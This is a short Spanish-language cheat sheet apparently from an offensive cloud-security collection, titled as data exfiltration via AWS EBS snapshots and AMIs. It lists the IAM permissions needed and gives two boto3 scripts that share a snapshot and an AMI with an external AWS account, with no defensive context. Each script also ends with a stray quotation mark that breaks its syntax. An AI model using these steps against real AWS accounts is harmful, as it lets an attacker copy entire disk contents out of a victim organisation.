# Exfiltracion de datos utilizando un Snapshots de EBS
## Permisos Requeridos: 
ec2:ModifySnapshotAttribute
ec2:DescribeSnapshots

```python
import boto3

# Crear un cliente de EC2
ec2_client = boto3.client('ec2')

# Definir el ID del snapshot
snapshot_id = 'snap-01234567890abcdef'

# Definir el ID de la cuenta AWS con la que compartir el snapshot
account_id = '012345678901'

# Compartir el snapshot con la cuenta AWS externa
ec2_client.modify_snapshot_attribute(
    SnapshotId=snapshot_id,
    Attribute='createVolumePermission',
    CreateVolumePermission={
        'Add': [{'UserId': account_id}]
    }
)"

```
		
# Exfiltracion de datos utilizando un Snapshots de una AMI
## Permisos Requeridos: 
ec2:ModifyImageAttribute
ec2:DescribeImages

```python
import boto3

# Crear un cliente de EC2
ec2_client = boto3.client('ec2')

# Definir el ID de la AMI
ami_id = 'ami-01234567890abcdef'

# Definir el ID de la cuenta AWS con la que compartir la AMI
account_id = '123456789012'

# Modificar los permisos de lanzamiento para compartir la AMI
ec2_client.modify_image_attribute(
    ImageId=ami_id,
    LaunchPermission={
        'Add': [{'UserId': account_id}]
    }
)"

```
